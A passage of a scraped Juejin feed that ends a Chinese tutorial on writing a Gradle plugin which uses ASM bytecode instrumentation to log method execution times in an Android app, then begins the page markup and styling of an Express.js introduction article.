    <span class="hljs-meta">@get:Input</span> 
    <span class="hljs-keyword">val</span> logTag: Property&lt;String&gt;  
  }  
  
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createClassVisitor</span><span class="hljs-params">(  
      classContext: <span class="hljs-type">ClassContext</span>,  
      nextClassVisitor: <span class="hljs-type">ClassVisitor</span>,  
  )</span></span>: ClassVisitor {
    <span class="hljs-comment">// 获取外部传进来的 tag</span>
    <span class="hljs-keyword">val</span> tag: String = parameters.<span class="hljs-keyword">get</span>().logTag.getOrElse(<span class="hljs-string">"Timing"</span>)
  
    <span class="hljs-keyword">return</span> TimingClassVisitor(  
        apiVersion = instrumentationContext.apiVersion.<span class="hljs-keyword">get</span>(),  
        nextClassVisitor = nextClassVisitor,  
        className = classContext.currentClassData.className,  
        logTag = tag, 
    )  
  }  
  
  <span class="hljs-comment">// 过滤逻辑：在这个方法里决定哪些类需要被“插桩” </span>
  <span class="hljs-comment">// 为了性能，这里只扫描 com.example.aop 包下的类</span>
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">isInstrumentable</span><span class="hljs-params">(classData: <span class="hljs-type">ClassData</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {  
    <span class="hljs-keyword">return</span> classData.className.startsWith(<span class="hljs-string">"com.example.aop"</span>)  
  }  
}
</code></pre>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                           &lt;-- app 模块目录
  ├── gradle/
  ├── build-logic/                   &lt;-- 复合构建的根目录
  │   ├── settings.gradle.kts        &lt;-- 管理 build-logic 内部的模块
  │   └── plugin/
  │       └── timing/                &lt;-- 插件模块目录
  │           ├─── build.gradle.kts  &lt;-- 插件的构建脚本
  │           └── src/ 
  │               └── main/kotlin/com/example/asm/timing/ 
<span class="hljs-addition">+ │                   ├── TimingClassVisitorFactory.kt</span>
<span class="hljs-addition">+ │                   ├── TimingClassVisitor.kt</span>
  │                   └── TimingMethodVisitor.kt
  ├── build.gradle.kts               &lt;-- 根项目的构建脚本
  └── settings.gradle.kts            &lt;-- 根项目的设置脚本
</code></pre>
<h3 data-id="heading-17">5. 插件入口</h3>
<p>最后一步，编写 Gradle 插件入口类 <code>TimingPlugin</code>，把所有东西串起来，并挂载到 Android 的构建流程中：</p>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                           &lt;-- app 模块目录
  ├── gradle/
  ├── build-logic/                   &lt;-- 复合构建的根目录
  │   ├── settings.gradle.kts        &lt;-- 管理 build-logic 内部的模块
  │   └── plugin/
  │       └── timing/                &lt;-- 插件模块目录
  │           ├─── build.gradle.kts  &lt;-- 插件的构建脚本
  │           └── src/ 
  │               └── main/kotlin/com/example/asm/timing/ 
<span class="hljs-addition">+ │                   ├── TimingPlugin.kt</span>
  │                   ├── TimingClassVisitorFactory.kt
  │                   ├── TimingClassVisitor.kt
  │                   └── TimingMethodVisitor.kt
  ├── build.gradle.kts               &lt;-- 根项目的构建脚本
  └── settings.gradle.kts            &lt;-- 根项目的设置脚本
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/plugin/timing/src/main/kotlin/com/example/asm/timing/TimingPlugin.kt</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TimingPlugin</span> : <span class="hljs-type">Plugin</span>&lt;<span class="hljs-type">Project</span>&gt; {  
  
  <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Extension</span> {  
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> logTag: Property&lt;String&gt;
    
    <span class="hljs-keyword">init</span> {  
      logTag.convention(<span class="hljs-string">"Timing"</span>) <span class="hljs-comment">// 默认的 LogTag</span>
    }
  }  
  
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">apply</span><span class="hljs-params">(project: <span class="hljs-type">Project</span>)</span></span> {  
    <span class="hljs-comment">// // 定义 DSL 扩展：允许用户在 build.gradle 中配置 </span>
    <span class="hljs-comment">// timing { </span>
    <span class="hljs-comment">//   logTag = "xxx" </span>
    <span class="hljs-comment">// }</span>
    <span class="hljs-keyword">val</span> extension: TimingPlugin.Extension = 
        project.extensions.create(<span class="hljs-string">"timing"</span>, TimingPlugin.Extension::<span class="hljs-keyword">class</span>.java)
  
    <span class="hljs-comment">// 获取 Android 组件扩展</span>
    <span class="hljs-keyword">val</span> androidComponents: AndroidComponentsExtension&lt;*, *, *&gt; = 
        project.extensions.getByType(AndroidComponentsExtension::<span class="hljs-keyword">class</span>.java)
    <span class="hljs-comment">// 对所有的 Variant (Debug/Release...) 进行操作</span>
    androidComponents.onVariants { variant -&gt;  
      <span class="hljs-comment">// 注册 ASM 转换</span>
      variant.instrumentation.transformClassesWith(
          TimingClassVisitorFactory::<span class="hljs-keyword">class</span>.java, <span class="hljs-comment">// 我们的 ClassVisitor 工厂类</span>
          InstrumentationScope.PROJECT, <span class="hljs-comment">// 作用范围：整个项目（不包括第三方库）</span>
      ) { parameters: TimingClassVisitorFactory.Parameters -&gt;
          <span class="hljs-comment">// 将 DSL 中的配置传给 Factory</span>
          parameters.logTag.<span class="hljs-keyword">set</span>(extension.logTag)
      }
      
      <span class="hljs-comment">// 重要：因为我们修改了字节码（增加了局部变量和堆栈操作）， </span>
      <span class="hljs-comment">// 需要让 AGP 帮我们重新计算栈帧（StackMapFrames），否则校验 class 文件会失败  </span>
      variant.instrumentation.setAsmFramesComputationMode(
          <span class="hljs-comment">// 仅重新计算被"插桩"了的方法的栈帧</span>
          FramesComputationMode.COMPUTE_FRAMES_FOR_INSTRUMENTED_METHODS 
      )
    }  
  }  
}
</code></pre>
<h3 data-id="heading-18">6. 见证奇迹</h3>
<p>现在，让我们回到 <code>:app</code> 模块，应用我们刚刚写好的插件。</p>
<pre><code class="hljs language-diff" lang="diff">// app/build.gradle.kts

plugins {  
   alias(libs.plugins.android.application)  
   alias(libs.plugins.kotlin.android)  
   alias(libs.plugins.kotlin.compose)  
<span class="hljs-addition">+  id("timing-plugin")  </span>
}

<span class="hljs-addition">+ timing {</span>
<span class="hljs-addition">+   logTag = "LogTime" </span>
<span class="hljs-addition">+ }</span>
</code></pre>
<p>Sync 一下 Gradle，然后点击 Run 运行 App。</p>
<p>当 App 启动时，可以把 Logcat 过滤器设为你设置的 tag。你会惊喜地发现：</p>
<pre><code class="hljs language-text" lang="text">D/...: com.example.aop.MainActivity.doSomeHeavyWork execution time: 103 ms
</code></pre>
<p>它工作了！我们在没有修改 <code>doSomeHeavyWork()</code> 源码的情况下，凭空让它拥有了自我计时的能力。这就是 ASM 插桩的魔力。</p>
<p>虽然我们在 <code>MethodVisitor</code> 里手写指令的过程有点像是在用镊子绣花，但一旦你掌握了这套逻辑，你就可以做很多更高级的事情。</p>
<p>ASM 是一把手术刀，用得好，它是优化和治理代码的神器。希望这篇文章能成为你字节码探索之旅的起点，而不是终点。</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbqliang%2FAsmExample" target="_blank" title="https://github.com/bqliang/AsmExample" ref="nofollow noopener noreferrer">文章完整代码</a></li>
</ul>
<h2 data-id="heading-19">参考链接</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fc6E5UlI1N%2Farticle%2Fdetails%2F131118310" target="_blank" title="https://blog.csdn.net/c6E5UlI1N/article/details/131118310" ref="nofollow noopener noreferrer">ASM从入门到精通</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.unlogged.io%2Fpost%2Fclass-file-api-not-your-everyday-java-api" target="_blank" title="https://www.unlogged.io/post/class-file-api-not-your-everyday-java-api" ref="nofollow noopener noreferrer">Class File API: Not Your Everyday Java API</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fxie.infoq.cn%2Farticle%2F46ccb9380c6e876e84b204ecc" target="_blank" title="https://xie.infoq.cn/article/46ccb9380c6e876e84b204ecc" ref="nofollow noopener noreferrer">手把手带你实战 AGP 7.x ASM 字节码插桩</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js的"老伙计"：Express框架入门记]]></title>    <link>https://juejin.cn/post/7575651989985984566</link>    <guid>https://juejin.cn/post/7575651989985984566</guid>    <pubDate>2025-11-24T03:07:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575651989985984566" data-draft-id="7575937594350141483" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js的&quot;老伙计&quot;：Express框架入门记"/> <meta itemprop="keywords" content="前端,Node.js"/> <meta itemprop="datePublished" content="2025-11-24T03:07:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="凌川纪"/> <meta itemprop="url" content="https://juejin.cn/user/3817120538318798"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js的"老伙计"：Express框架入门记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817120538318798/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    凌川纪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:07:15.000Z" title="Mon Nov 24 2025 03:07:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 